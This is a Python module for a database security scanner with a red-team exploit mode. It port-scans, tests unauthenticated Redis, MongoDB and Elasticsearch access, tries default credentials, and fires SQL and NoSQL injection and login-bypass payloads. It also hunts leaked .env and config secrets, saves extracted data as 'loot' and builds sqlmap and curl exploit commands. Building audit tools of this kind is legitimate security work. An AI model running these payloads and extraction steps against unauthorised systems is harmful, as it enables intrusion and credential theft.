"""
db_security — dedicated database security audit (the 'db_scan' profile).

A single module that, in order: scans default DB ports and fingerprints the engine from the
banner; tests for unauthenticated access (Redis, Memcached, Elasticsearch, CouchDB, MongoDB)
and default credentials (where a driver is available); probes crawled parameters for SQL and
NoSQL injection; hunts exposed DB admin interfaces, dump/backup files, and framework debug
leaks; checks TLS on DB ports; and finally computes a DB Exposure Score (0-100) with a grade.

Every check is wrapped so one failure never crashes the audit. Safe mode skips the
destructive checks (default creds, time-based SQLi, NoSQL) and limits the port scan.
"""
from __future__ import annotations

import json
import re
import socket
import ssl
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from pathlib import Path
from urllib.parse import urlparse

import httpx
from loguru import logger

from config import PROJECT_ROOT
from scanner.engine import Finding, Severity, ScanEngine
from scanner.recon.port_scan import _is_accept_all, _probe_port, _resolve  # reuse connect/banner/accept-all
from scanner.vulns._common import Injector, get, inject_param, is_safe_mode, iter_injectors

MODULE = "db_security"

# port → engine label
_DB_PORTS: dict[int, str] = {
    3306: "MySQL/MariaDB", 5432: "PostgreSQL", 1433: "MSSQL", 1521: "Oracle",
    27017: "MongoDB", 6379: "Redis", 9200: "Elasticsearch", 9300: "Elasticsearch",
    5984: "CouchDB", 9042: "Cassandra", 11211: "Memcached",
}
_SAFE_PORTS = (3306, 5432, 1433, 27017, 6379)

# Exposure-score weights (counted once per category that fired).
_SCORE = {"unauth": 30, "cloud_db": 30, "cred_reuse": 30, "sqli": 25, "authbypass": 25,
          "default_creds": 20, "creds_leak": 20, "admin_200": 15,
          "dump": 10, "nosql": 10, "graphql": 10, "tls": 5, "admin_403": 5}

# MITRE ATT&CK technique per finding category (red-team reporting).
_ATTACK = {
    "unauth": "T1190 Exploit Public-Facing Application",
    "cloud_db": "T1530 Data from Cloud Storage",
    "sqli": "T1190 Exploit Public-Facing Application",
    "authbypass": "T1212 Exploitation for Credential Access",
    "nosql": "T1190 Exploit Public-Facing Application",
    "graphql": "T1213 Data from Information Repositories",
    "creds_leak": "T1552.001 Credentials in Files",
    "default_creds": "T1078.001 Default Accounts",
    "cred_reuse": "T1078 Valid Accounts",
    "dump": "T1213 Data from Information Repositories",
    "admin_200": "T1190 Exploit Public-Facing Application",
    "admin_403": "T1087 Account Discovery",
    "extraction": "T1213 Data from Information Repositories",
}

# Headers an attacker can smuggle injection through (server often logs/queries these).
_INJECT_HEADERS = ["User-Agent", "Referer", "X-Forwarded-For", "X-Forwarded-Host", "X-Real-IP"]

# Cloud / managed database fingerprints found in page/JS source.
_FIREBASE_RE = re.compile(r"https?://([a-z0-9-]+)\.firebaseio\.com", re.I)
_FIREBASE_CFG_RE = re.compile(r"['\"]databaseURL['\"]\s*:\s*['\"]https?://([a-z0-9-]+)\.firebaseio\.com", re.I)
_SUPABASE_RE = re.compile(r"https?://([a-z0-9]+)\.supabase\.co", re.I)
_SUPABASE_KEY_RE = re.compile(r"(eyJ[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,})")
_FIRESTORE_RE = re.compile(r"firestore\.googleapis\.com/v1/projects/([a-z0-9-]+)", re.I)

# ---------------------------------------------------------------------------
# SQL injection payloads & error signatures
# ---------------------------------------------------------------------------

_ERR_PAYLOADS = ["'", "''", "`", "')", "'))", "1' OR '1'='1", "1' OR '1'='2"]
_BOOL_PAYLOADS = [("1 AND 1=1", "1 AND 1=2")]
_TIME_PAYLOADS = [
    ("MSSQL", "1; WAITFOR DELAY '0:0:{t}'--"),
    ("MySQL", "1 AND SLEEP({t})--"),
    ("PostgreSQL", "1; SELECT pg_sleep({t})--"),
]
_SQL_ERRORS: list[tuple[re.Pattern[str], str]] = [(re.compile(p, re.I), e) for p, e in [
    (r"you have an error in your sql syntax|mysql_fetch|mysql server version", "MySQL"),
    (r"pg_query\(\)|psqlexception|unterminated quoted", "PostgreSQL"),
    (r"unclosed quotation mark|ole db|sqlexception", "MSSQL"),
    (r"ora-\d{4,5}|oracle error|quoted string not properly ended", "Oracle"),
    (r"sqlite3::|sqlite_error|unrecognized token", "SQLite"),
    (r"odbc driver|database error|sql syntax", "Generic SQL"),
]]

_NOSQL_PAYLOADS = ['{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}', '{"$regex": ".*"}']

_ADMIN_PATHS = [
    "/phpmyadmin", "/phpmyadmin/", "/pma", "/PMA", "/phpMyAdmin", "/mysql", "/myadmin",
    "/adminer.php", "/adminer", "/adminer/", "/pgadmin", "/pgadmin4", "/phppgadmin",
    "/mongodb", "/mongo-express", "/mongoui", "/rockmongo", "/_utils", "/_utils/",
    "/redis-commander", "/redisinsight", "/redisadmin",
    "/elasticsearch-head", "/_plugin/head/", "/kibana", "/app/kibana", "/grafana",
    "/pgweb", "/sqlpad", "/cloudbeaver", "/dbgate",
    "/db", "/database", "/dbadmin", "/sqladmin", "/sql",
]
_ADMIN_SIG = re.compile(r"phpmyadmin|adminer|pgadmin|phppgadmin|mongo.?express|rockmongo|"
                        r"redis.?commander|redisinsight|kibana|grafana|elasticsearch|"
                        r"fauxton|sqlpad|cloudbeaver|dbgate|pgweb", re.I)

_DUMP_PATHS = [
    "/backup.sql", "/dump.sql", "/database.sql", "/db.sql",
    "/backup.sql.gz", "/dump.sql.gz", "/database.sql.gz",
    "/site.sql", "/wordpress.sql", "/backup.db",
    "/data/dump.sql", "/backups/db.sql", "/sql/backup.sql",
]

_FRAMEWORK_PATHS = [
    ("/actuator/env", "Spring Actuator"), ("/actuator/configprops", "Spring Actuator"),
    ("/rails/info/properties", "Rails"),
]
_DB_CRED_RE = re.compile(r"DB_PASSWORD|DB_HOST|DB_USERNAME|database_password|"
                         r"spring\.datasource|connectionstring", re.I)

# Hardcoded DB connection strings / credentials leaked in page or inline JS.
_CONNSTR_RE = re.compile(
    r"(?:mongodb(?:\+srv)?|postgres(?:ql)?|mysql|mariadb|redis|amqp|mssql|sqlserver)://[^\s\"'<>`]{6,150}"
    r"|jdbc:[a-z0-9]+://[^\s\"'<>`]{6,150}"
    r"|Data Source=[^;\"'<>]+;[^\"'<>]{0,120}?Password=[^;\"'<>]+", re.I)

# GraphQL endpoints to probe for introspection.
_GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/v1/graphql", "/graphql/console",
                  "/graphiql", "/v2/graphql", "/query"]

# Extra database file types to hunt (SQLite, Access, more dumps).
_EXTRA_DUMP_PATHS = [
    "/database.sqlite", "/database.sqlite3", "/db.sqlite3", "/app.db", "/data.db",
    "/database.db", "/database.mdb", "/db.mdb",
    "/mysql.sql", "/db_backup.sql", "/dump/db.sql", "/sql/dump.sql",
    "/backup/database.sql", "/backup.sql.zip", "/database.sql.zip", "/dump.tar.gz",
]
_SQLITE_MAGIC = b"SQLite format 3"

# DB credential / config files to hunt (server-side secrets that leak DB access).
_SECRET_FILES = [
    "/.env", "/.env.local", "/.env.production", "/.env.dev", "/.env.backup", "/.env.bak",
    "/config/database.yml", "/config/database.php", "/config/database.json",
    "/config.php", "/configuration.php", "/wp-config.php", "/wp-config.php.bak",
    "/database.yml", "/settings.py", "/local_settings.py", "/config.json",
    "/application.properties", "/application.yml", "/appsettings.json",
    "/ormconfig.json", "/knexfile.js", "/sequelize.json", "/prisma/.env",
    "/.pgpass", "/my.cnf", "/.my.cnf", "/mysql.cnf",
    "/docker-compose.yml", "/docker-compose.yaml",
    "/credentials.json", "/secrets.json", "/db.json",
]
# Tokens that prove DB credentials live inside a leaked config file.
_SECRET_CRED_RE = re.compile(
    r"(DB_PASSWORD|DB_USERNAME|DB_USER|DB_HOST|DB_DATABASE|DB_CONNECTION|"
    r"MYSQL_(?:ROOT_)?PASSWORD|POSTGRES_PASSWORD|MONGO_INITDB_ROOT_PASSWORD|"
    r"database_password|spring\.datasource|jdbc:|PGPASSWORD|"
    r"password\s*[:=]|passwd\s*=)", re.I)


# ---------------------------------------------------------------------------
# Finding factory
# ---------------------------------------------------------------------------

def _f(title, desc, sev, rec, category, **raw) -> Finding:
    raw["db_category"] = category
    raw.setdefault("confidence", "high")
    if category in _ATTACK:
        raw.setdefault("attack", _ATTACK[category])
    return Finding(module=MODULE, title=title, description=desc, severity=sev,
                   recommendation=rec, raw=raw)


# ---------------------------------------------------------------------------
# Evidence on disk (red-team loot) — only written in active (--exploit) mode
# ---------------------------------------------------------------------------

def _loot_dir(engine: ScanEngine) -> Path:
    """Create and return loot/<host>_<timestamp>/ for extracted evidence (gitignored)."""
    host = urlparse(engine.url).hostname or "target"
    safe_host = re.sub(r"[^A-Za-z0-9_.-]", "_", host)
    d = PROJECT_ROOT / "loot" / f"{safe_host}_{time.strftime('%Y%m%d_%H%M%S')}"
    d.mkdir(parents=True, exist_ok=True)
    return d


def _save_evidence(loot: Path | None, name: str, data: "str | bytes") -> str:
    """Write *data* to loot/<name>, returning the path (or '' if no loot dir)."""
    if loot is None:
        return ""
    safe = re.sub(r"[^A-Za-z0-9_.-]", "_", name)[:80]
    path = loot / safe
    try:
        mode, payload = ("wb", data) if isinstance(data, bytes) else ("w", data)
        with open(path, mode, encoding=None if "b" in mode else "utf-8") as fh:
            fh.write(payload)
        return str(path)
    except OSError as exc:  # noqa: BLE001
        logger.debug(f"db_security: could not write evidence {name}: {exc}")
        return ""


# ---------------------------------------------------------------------------
# Raw TCP helper (mockable in tests)
# ---------------------------------------------------------------------------

def _tcp_send_recv(host: str, port: int, payload: bytes, timeout: float = 3.0,
                   read: int = 4096) -> bytes:
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            if payload:
                sock.sendall(payload)
            data = b""
            try:
                while len(data) < read:
                    chunk = sock.recv(read)
                    if not chunk:
                        break
                    data += chunk
            except socket.timeout:
                pass
            return data
    except OSError as exc:
        logger.debug(f"db_security: TCP {host}:{port} → {exc}")
        return b""


# ---------------------------------------------------------------------------
# Exposure detection
# ---------------------------------------------------------------------------

@dataclass
class _OpenPort:
    port: int
    engine: str
    banner: str
    version: str = ""


def _fingerprint_version(banner: str) -> str:
    m = re.search(r"(\d+\.\d+(?:\.\d+)?)", banner)
    return m.group(1) if m else ""


def _scan_ports(ip: str, safe: bool, workers: int) -> list[_OpenPort]:
    ports = list(_SAFE_PORTS if safe else _DB_PORTS.keys())
    found: list[_OpenPort] = []
    with ThreadPoolExecutor(max_workers=max(workers, len(ports))) as pool:
        futures = {pool.submit(_probe_port, ip, p): p for p in ports}
        for fut in as_completed(futures):
            port = futures[fut]
            try:
                is_open, banner = fut.result()
            except Exception:  # noqa: BLE001
                continue
            if is_open:
                found.append(_OpenPort(port, _DB_PORTS.get(port, "Unknown"),
                                       banner, _fingerprint_version(banner)))
    return sorted(found, key=lambda o: o.port)


# ---------------------------------------------------------------------------
# Unauthenticated-access checks
# ---------------------------------------------------------------------------

def _unauth_finding(engine_name: str, host: str, port: int, detail: str) -> Finding:
    return _f(f"Unauthenticated {engine_name} Access: {host}:{port}",
              f"{engine_name} on {host}:{port} is reachable WITHOUT authentication ({detail}). "
              "Anyone on the internet can read or modify the data.",
              Severity.CRITICAL,
              f"Enable authentication on {engine_name}, bind it to localhost/VPN, and firewall the port.",
              "unauth", host=host, port=port, engine=engine_name)


def _check_redis(host: str, port: int) -> list[Finding]:
    resp = _tcp_send_recv(host, port, b"PING\r\n")
    if b"+PONG" not in resp:
        if b"NOAUTH" in resp or b"-ERR" in resp.upper():
            return [_f(f"Redis Requires Authentication: {host}:{port}",
                       f"Redis on {host}:{port} demands AUTH (good), but the port is publicly reachable.",
                       Severity.LOW, "Keep auth on and firewall the port.", "tls",
                       host=host, port=port, engine="Redis")]
        return []

    # Unauthenticated — extract proof-of-data (the exploitation step).
    info = _tcp_send_recv(host, port, b"INFO server\r\n")
    ver = _extract(info, rb"redis_version:([0-9.]+)")
    nkeys = _extract(_tcp_send_recv(host, port, b"DBSIZE\r\n"), rb":(\d+)")
    keys_raw = _tcp_send_recv(host, port, b"KEYS *\r\n")
    sample_keys = [k.decode("latin-1", "replace") for k in re.findall(rb"\r\n([^\r\n$*:+-][^\r\n]*)", keys_raw)][:8]

    fnd = _unauth_finding("Redis", host, port,
                          f"PING/INFO without AUTH" + (f", v{ver}" if ver else "")
                          + (f", {nkeys} keys" if nkeys else ""))
    fnd.raw.update(keys_count=nkeys, sample_keys=sample_keys,
                   exploit_cmd=f"redis-cli -h {host} -p {port}   # then: KEYS *  /  GET <key>  /  CONFIG GET *")
    if sample_keys:
        fnd.description += " Sample keys: " + ", ".join(sample_keys[:6]) + "."
    out = [fnd]

    # CONFIG reachable → write-to-disk → RCE (webshell / SSH key / cron).
    cfg = _tcp_send_recv(host, port, b"CONFIG GET dir\r\n")
    if b"dir" in cfg and b"unknown command" not in cfg.lower() and b"-NOPERM" not in cfg.upper():
        out.append(_f(f"Redis CONFIG Reachable — Remote Code Execution: {host}:{port}",
                      f"Unauthenticated Redis on {host}:{port} exposes CONFIG GET/SET. An attacker can "
                      "rewrite 'dir'/'dbfilename' to drop a web shell, SSH key, or cron job — full RCE.",
                      Severity.CRITICAL,
                      "Require AUTH, run 'rename-command CONFIG \"\"', enable protected-mode, firewall the port.",
                      "unauth", host=host, port=port, engine="Redis",
                      exploit_cmd="See redis RCE via CONFIG SET dir + SAVE (write webshell/SSH key)."))
    return out


def _check_memcached(host: str, port: int) -> list[Finding]:
    resp = _tcp_send_recv(host, port, b"stats\r\n")
    if b"STAT " in resp or b"pid" in resp:
        return [_unauth_finding("Memcached", host, port, "'stats' returned data without auth")]
    return []


def _extract(data: bytes, pattern: bytes) -> str:
    m = re.search(pattern, data)
    return m.group(1).decode("latin-1", "replace") if m else ""


def _check_mongodb(host: str, port: int) -> list[Finding]:
    """Best-effort: legacy OP_QUERY listDatabases on admin.$cmd (no auth)."""
    # BSON for {listDatabases: 1}
    doc = b"\x10listDatabases\x00\x01\x00\x00\x00"          # int32 field "listDatabases"=1
    bson = (len(doc) + 5).to_bytes(4, "little") + doc + b"\x00"
    body = (b"\x00\x00\x00\x00" + b"admin.$cmd\x00"
            + (0).to_bytes(4, "little") + (1).to_bytes(4, "little") + bson)
    header = (16 + len(body)).to_bytes(4, "little") + (1).to_bytes(4, "little") \
        + b"\x00\x00\x00\x00" + (2004).to_bytes(4, "little")     # OP_QUERY
    resp = _tcp_send_recv(host, port, header + body, read=2048)
    if b"databases" in resp and b"sizeOnDisk" in resp:
        return [_unauth_finding("MongoDB", host, port, "listDatabases succeeded without auth")]
    if b"not authorized" in resp or b"requires authentication" in resp.lower():
        return []
    return []


def _check_elasticsearch(engine: ScanEngine, host: str, port: int) -> list[Finding]:
    """Unauthenticated Elasticsearch → list indices and document counts (data exposure)."""
    for scheme in ("http", "https"):
        try:
            root = engine.request("GET", f"{scheme}://{host}:{port}/", timeout=6.0)
        except httpx.HTTPError:
            continue
        if root.status_code in (401, 403):
            return []
        if root.status_code == 200 and ('"cluster_name"' in root.text or '"lucene_version"' in root.text):
            indices, docs = [], 0
            try:
                idx = engine.request("GET", f"{scheme}://{host}:{port}/_cat/indices?format=json", timeout=6.0)
                for i in (idx.json() if idx.status_code == 200 else []):
                    if isinstance(i, dict):
                        indices.append(i.get("index", "?"))
                        docs += int(i.get("docs.count", 0) or 0)
            except Exception:  # noqa: BLE001
                pass
            f = _unauth_finding("Elasticsearch", host, port,
                                f"open cluster, {len(indices)} index(es), ~{docs} documents")
            f.raw.update(indices=indices[:15], doc_count=docs,
                         exploit_cmd=f"curl '{scheme}://{host}:{port}/_search?size=20&pretty'")
            if indices:
                f.description += " Indices: " + ", ".join(indices[:10]) + "."
            return [f]
    return []


def _check_couchdb(engine: ScanEngine, host: str, port: int) -> list[Finding]:
    for scheme in ("http", "https"):
        try:
            r = engine.request("GET", f"{scheme}://{host}:{port}/_all_dbs", timeout=6.0)
        except httpx.HTTPError:
            continue
        if r.status_code in (401, 403):
            return []
        if r.status_code == 200 and r.text.strip().startswith("["):
            try:
                dbs = [d for d in r.json() if isinstance(d, str)]
            except Exception:  # noqa: BLE001
                dbs = []
            f = _unauth_finding("CouchDB", host, port, f"_all_dbs returned {len(dbs)} database(s)")
            f.raw.update(databases=dbs[:20],
                         exploit_cmd=f"curl '{scheme}://{host}:{port}/_all_dbs' then /<db>/_all_docs")
            if dbs:
                f.description += " Databases: " + ", ".join(dbs[:10]) + "."
            return [f]
    return []


def _redact(s: str) -> str:
    return re.sub(r"(://[^:/\s]+:)[^@/\s]+(@)", r"\1***\2", s)


def _redact_line(line: str) -> str:
    """Mask password values in a 'KEY=value' / 'key: value' / URL credential line."""
    line = re.sub(r"((?:password|passwd|pwd|pass|pgpassword)\s*[:=]\s*)\S+",
                  r"\1***", line, flags=re.I)
    return _redact(line)


def _check_secret_files(engine: ScanEngine, catch_all: bool) -> list[Finding]:
    """Hunt server-side config files that leak DB credentials (.env, database.yml, my.cnf...)."""
    findings: list[Finding] = []
    for path in _SECRET_FILES:
        resp = _http_get(engine, path)
        if resp is None or resp.status_code != 200 or not resp.content or catch_all:
            continue
        body = resp.text
        ctype = resp.headers.get("content-type", "").lower()
        # A real config/secret file is served as text, not as an HTML app page.
        if "html" in ctype or body[:64].lstrip().lower().startswith(("<!doctype", "<html")):
            continue
        m = _SECRET_CRED_RE.search(body)
        if not m:
            continue
        cred_lines = [ln.strip() for ln in body.splitlines() if _SECRET_CRED_RE.search(ln)]
        # Prefer a line that actually carries a password value for the proof snippet.
        cred_line = next((ln for ln in cred_lines if re.search(r"pass(?:wd|word)?|pgpassword", ln, re.I)),
                         cred_lines[0] if cred_lines else m.group(0))
        url = _origin(engine) + path
        findings.append(_f(
            f"Database Credentials File Exposed: {path}",
            f"The config file {url} is publicly readable and contains database credentials "
            f"(matched {m.group(1)!r}). Proof: {_redact_line(cred_line)[:120]}",
            Severity.CRITICAL,
            "Move secrets out of the web root, deny dotfiles/config files at the server level, "
            "and rotate the exposed database password immediately.",
            "creds_leak", path=path, url=url, proof_url=url,
            secret_match=_redact_line(cred_line)[:200],
            exploit_cmd=f"curl -s {url}   # harvest DB_HOST/DB_USER/DB_PASSWORD, then connect directly"))
    return findings


def _check_connstrings(engine: ScanEngine) -> list[Finding]:
    """Scan crawled page/inline-JS source for leaked DB connection strings & credentials."""
    try:
        crawl = engine.get_crawl()
    except Exception:  # noqa: BLE001
        return []
    findings: list[Finding] = []
    seen: set[str] = set()
    for url, html in crawl.pages.items():
        for match in _CONNSTR_RE.findall(html):
            snippet = match[:140]
            if snippet.lower() in seen:
                continue
            seen.add(snippet.lower())
            creds = ("://" in match and "@" in match) or "password=" in match.lower()
            findings.append(_f(
                "Database Connection String Leaked",
                f"A database connection string is exposed in the source of {url}: {_redact(snippet)}"
                + (" — it contains credentials." if creds else "."),
                Severity.CRITICAL if creds else Severity.HIGH,
                "Never embed DB connection strings/credentials in front-end code; use server-side "
                "secrets and rotate any exposed password immediately.",
                "creds_leak" if creds else "admin_403",
                url=url, snippet=_redact(snippet), has_credentials=creds, proof_url=url))
    return findings


def _check_graphql(engine: ScanEngine) -> list[Finding]:
    for path in _GRAPHQL_PATHS:
        try:
            resp = engine.request("POST", _origin(engine) + path,
                                  json={"query": "{__schema{types{name}}}"}, timeout=6.0)
        except httpx.HTTPError:
            continue
        if resp.status_code == 200 and '"__schema"' in resp.text and '"types"' in resp.text:
            types: list[str] = []
            try:
                types = [t["name"] for t in resp.json()["data"]["__schema"]["types"]
                         if not str(t.get("name", "")).startswith("__")][:20]
            except Exception:  # noqa: BLE001
                pass
            url = _origin(engine) + path
            return [_f(f"GraphQL Introspection Enabled: {path}",
                       f"GraphQL at {url} exposes its entire schema via introspection — an attacker maps "
                       "every query, mutation and hidden data type. Types: " + ", ".join(types) + ".",
                       Severity.HIGH,
                       "Disable introspection in production and enforce authorization on every field.",
                       "graphql", url=url, types=types, proof_url=url,
                       exploit_cmd=f"Run graphw00f/clairvoyance, or POST a full introspection query to {path}")]
    return []


# ---------------------------------------------------------------------------
# Default credentials (optional drivers; graceful skip)
# ---------------------------------------------------------------------------

def _check_default_creds(host: str, port: int, engine_name: str) -> list[Finding]:
    creds: list[tuple[str, str]] = []
    found = None
    try:
        if engine_name.startswith("MySQL"):
            import pymysql  # type: ignore  # noqa: PLC0415
            for user, pwd in [("root", ""), ("root", "root"), ("root", "mysql")]:
                try:
                    pymysql.connect(host=host, port=port, user=user, password=pwd,
                                    connect_timeout=4).close()
                    found = (user, pwd or "(empty)")
                    break
                except Exception:  # noqa: BLE001
                    continue
        elif engine_name == "PostgreSQL":
            import psycopg2  # type: ignore  # noqa: PLC0415
            for user, pwd in [("postgres", "postgres"), ("postgres", "")]:
                try:
                    psycopg2.connect(host=host, port=port, user=user, password=pwd,
                                     connect_timeout=4).close()
                    found = (user, pwd or "(empty)")
                    break
                except Exception:  # noqa: BLE001
                    continue
    except ImportError:
        logger.debug(f"db_security: no driver to test default creds for {engine_name}")
        return []
    except Exception as exc:  # noqa: BLE001
        logger.debug(f"db_security: default-cred test error: {exc}")
        return []

    if found:
        return [_f(f"Default Credentials Work: {engine_name} {host}:{port}",
                   f"{engine_name} accepted default credentials {found[0]}/{found[1]}. Full database "
                   "access with no real authentication.",
                   Severity.CRITICAL, "Set a strong unique password immediately and restrict network access.",
                   "default_creds", host=host, port=port, engine=engine_name,
                   credential=f"{found[0]}/{found[1]}")]
    return []


# ---------------------------------------------------------------------------
# SQL / NoSQL injection on crawled parameters
# ---------------------------------------------------------------------------

def _detect_sql_error(text: str) -> str | None:
    for rx, eng in _SQL_ERRORS:
        if rx.search(text):
            return eng
    return None


def _check_sqli(engine: ScanEngine, safe: bool) -> list[Finding]:
    findings: list[Finding] = []
    injectors = iter_injectors(engine)
    for inj in injectors:
        hit = _sqli_one(engine, inj, safe)
        if hit:
            findings.append(hit)
    return findings


def _sqli_one(engine, inj, safe):
    # error-based
    for payload in _ERR_PAYLOADS:
        resp = inj.inject(payload)
        if resp is not None and (eng := _detect_sql_error(resp.text)):
            return _sqli_finding(inj, payload, "error-based", eng)
    # boolean-based
    base = inj.inject("1")
    if base is not None:
        for t_payload, f_payload in _BOOL_PAYLOADS:
            rt, rf = inj.inject(t_payload), inj.inject(f_payload)
            if rt is not None and rf is not None and len(rt.text) and \
                    abs(len(rt.text) - len(base.text)) < len(base.text) * 0.05 < abs(len(rf.text) - len(base.text)):
                return _sqli_finding(inj, t_payload, "boolean-based", "Generic SQL")
    # time-based (URL params only, not safe mode)
    if not safe and inj.proof:
        from scanner.vulns._common import timed_get  # noqa: PLC0415
        b = timed_get(engine, inj.proof("1"))
        if b is not None:
            for eng, tmpl in _TIME_PAYLOADS:
                t = timed_get(engine, inj.proof(tmpl.format(t=2)))
                if t is not None and (t - b) > 1.8:
                    return _sqli_finding(inj, tmpl.format(t=2), "time-based", eng)
    return None


_SQLMAP_TECH = {"error-based": "E", "boolean-based": "B", "time-based": "T"}


def _sqli_finding(inj, payload, technique, engine_name) -> Finding:
    proof = inj.proof(payload) if inj.proof else None
    extra: dict = {"parameter": inj.param, "technique": technique, "engine": engine_name,
                   "payload": payload, "proof_url": proof}
    desc = (f"Parameter '{inj.param}' at {inj.label} is SQL-injectable ({technique}, {engine_name}). "
            f"Payload: {payload!r}.")
    # Attach a ready sqlmap command so the --exploit launcher can attack it.
    if inj.url:
        flag = _SQLMAP_TECH.get(technique, "BEUSTQ")
        extra["sqlmap_args"] = ["-u", inj.url, "-p", inj.param, "--batch",
                                f"--technique={flag}", "--threads=10", "--dbs"]
        extra["sqlmap"] = (f'sqlmap -u "{inj.url}" -p {inj.param} --batch '
                           f"--technique={flag} --threads=10 --dbs")
        desc += f"\n\nExploit with sqlmap (authorised targets only):\n  {extra['sqlmap']}"
    return _f(f"SQL Injection ({technique}): {inj.param} ({engine_name})", desc,
              Severity.CRITICAL,
              "Use parameterised queries; never concatenate user input into SQL.",
              "sqli", **extra)


# ---------------------------------------------------------------------------
# Expanded surface: SQL injection through HTTP headers & cookies
# ---------------------------------------------------------------------------

def _header_cookie_injectors(engine: ScanEngine) -> list[Injector]:
    """Injectors that smuggle the payload through HTTP headers and cookies (no URL proof)."""
    base_url = engine.url
    injectors: list[Injector] = [
        Injector(label=f"HTTP header '{hdr}'", param=hdr,
                 inject=(lambda payload, h=hdr: get(engine, base_url, headers={h: payload})),
                 proof=None)
        for hdr in _INJECT_HEADERS
    ]
    # Cookies discovered from a baseline response (server may query them).
    try:
        cookie_names = list(engine.request("GET", base_url).cookies.keys())
    except httpx.HTTPError:
        cookie_names = []
    for cname in cookie_names[:5]:
        injectors.append(Injector(
            label=f"cookie '{cname}'", param=cname,
            inject=(lambda payload, c=cname: get(engine, base_url, headers={"Cookie": f"{c}={payload}"})),
            proof=None))
    return injectors


def _check_injection_headers(engine: ScanEngine, safe: bool) -> list[Finding]:
    """Reuse the SQLi engine against header/cookie vectors (error/boolean only)."""
    if safe:
        return []
    findings: list[Finding] = []
    for inj in _header_cookie_injectors(engine):
        hit = _sqli_one(engine, inj, safe)
        if hit:
            findings.append(hit)
    return findings


def _check_nosql(engine: ScanEngine, safe: bool,
                 skip_params: "set[str] | None" = None) -> list[Finding]:
    if safe:
        return []
    skip_params = skip_params or set()
    findings: list[Finding] = []
    for inj in iter_injectors(engine):
        if inj.proof is None or inj.param in skip_params:
            continue
        base = inj.inject("1")
        if base is None:
            continue
        sql_param = False
        hit_payload: str | None = None
        for payload in _NOSQL_PAYLOADS:
            resp = inj.inject(payload)
            if resp is None:
                continue
            # A SQL error means the parameter is SQL-injectable, not NoSQL — don't double-report.
            if _detect_sql_error(resp.text):
                sql_param = True
                break
            size_delta = abs(len(resp.text) - len(base.text)) / max(len(base.text), 1)
            # Require a status-code change or a large body change to limit false positives.
            if resp.status_code != base.status_code or size_delta > 0.40:
                hit_payload = payload
                break
        if sql_param or hit_payload is None:
            continue
        findings.append(_f(f"Possible NoSQL Injection: {inj.param}",
                           f"Parameter '{inj.param}' changed behaviour for NoSQL operator "
                           f"{hit_payload!r} (status/size delta) with no SQL error. Verify manually.",
                           Severity.CRITICAL,
                           "Cast/validate input types; never pass raw user objects to NoSQL queries.",
                           "nosql", parameter=inj.param, payload=hit_payload,
                           proof_url=inj.proof(hit_payload), confidence="medium"))
    return findings


# Login-failure vs authenticated markers — used to confirm a *real* auth bypass.
_LOGIN_FAIL_RE = re.compile(
    r"invalid|incorrect|failed|wrong|denied|not match|bad cred|try again|"
    r"authentication failed|login failed|does ?n.t exist", re.I)
_LOGIN_AUTH_RE = re.compile(
    r"log\s*out|sign\s*out|welcome\b|dashboard|my ?account|your profile|logged ?in", re.I)


def _login_success(base: httpx.Response, attempt: "httpx.Response | None") -> bool:
    """Confirm a NoSQL auth bypass ONLY on a clear failure→success transition.

    Weak signals (a new session cookie, a size change, a redirect) fire on normal frameworks
    (ASP.NET ViewState, per-request session ids) and caused false positives, so they are not
    used. We require that the wrong-credentials baseline shows a login failure while the
    operator-injection attempt no longer does (or shows an authenticated marker the baseline
    lacked).
    """
    if attempt is None or attempt.status_code >= 500:
        return False
    base_fail = bool(_LOGIN_FAIL_RE.search(base.text))
    att_fail = bool(_LOGIN_FAIL_RE.search(attempt.text))
    if base_fail and not att_fail:
        return True
    if _LOGIN_AUTH_RE.search(attempt.text) and not _LOGIN_AUTH_RE.search(base.text):
        return True
    return False


def _check_nosql_authbypass(engine: ScanEngine, safe: bool) -> list[Finding]:
    """NoSQL operator-injection auth bypass on POST login forms ({"$ne":""})."""
    if safe:
        return []
    try:
        crawl = engine.get_crawl()
    except Exception:  # noqa: BLE001
        return []
    findings: list[Finding] = []
    for form in crawl.forms:
        if (form.method or "").lower() != "post":
            continue
        pw_fields = [f for f in form.fields if "pass" in f.lower()]
        if not pw_fields:
            continue
        # Skip ASP.NET WebForms / other non-NoSQL stacks: a Mongo bypass is impossible there,
        # and their hidden ViewState fields make the heuristic misfire (false positives).
        if any(f.lower().startswith("__view") or "eventvalidation" in f.lower()
               or "csrf" in f.lower() or "requestverificationtoken" in f.lower()
               for f in form.fields):
            continue
        # Inject into the password field(s) plus the first non-password (username) field.
        user_field = [f for f in form.fields if f not in pw_fields][:1]
        targets = list(dict.fromkeys([*user_field, *pw_fields]))
        # Baseline: deliberately wrong credentials.
        bad = {k: "nonexistent_zzz_" + k for k in form.fields}
        try:
            base = engine.request("POST", form.action, data=bad)
        except httpx.HTTPError:
            continue
        # Attempt 1 — urlencoded operator injection (user[$ne]=).
        data1 = {k: v for k, v in form.fields.items() if k not in targets}
        for f in targets:
            data1[f + "[$ne]"] = ""
        # Attempt 2 — JSON operator injection.
        body2 = {f: {"$ne": ""} for f in targets}
        a1 = get_post(engine, form.action, data=data1)
        a2 = get_post(engine, form.action, json=body2)
        hit = next(((label, a) for label, a in (("user[$ne]= (urlencoded)", a1),
                                                ('{"$ne":""} (JSON)', a2))
                    if _login_success(base, a)), None)
        if hit:
            label, _ = hit
            findings.append(_f(
                f"NoSQL Authentication Bypass: {form.action}",
                f"The login form at {form.action} accepted a NoSQL operator-injection payload "
                f"({label}) and behaved as an authenticated session — credentials were bypassed.",
                Severity.CRITICAL,
                "Cast inputs to strings server-side; reject objects/operators in auth queries.",
                "authbypass", url=form.action, payload=label, proof_url=form.action,
                confidence="medium", exploit_cmd=f"Replay {label} into the login fields at {form.action}"))
    return findings


def get_post(engine: ScanEngine, url: str, **kwargs) -> "httpx.Response | None":
    try:
        return engine.request("POST", url, **kwargs)
    except httpx.HTTPError:
        return None


# ---------------------------------------------------------------------------
# Admin interfaces / dump files / framework leaks
# ---------------------------------------------------------------------------

def _origin(engine: ScanEngine) -> str:
    """scheme://host[:port] of the target (path-based probes must hit the root, not the URL path)."""
    p = urlparse(engine.url)
    return f"{p.scheme}://{p.netloc}"


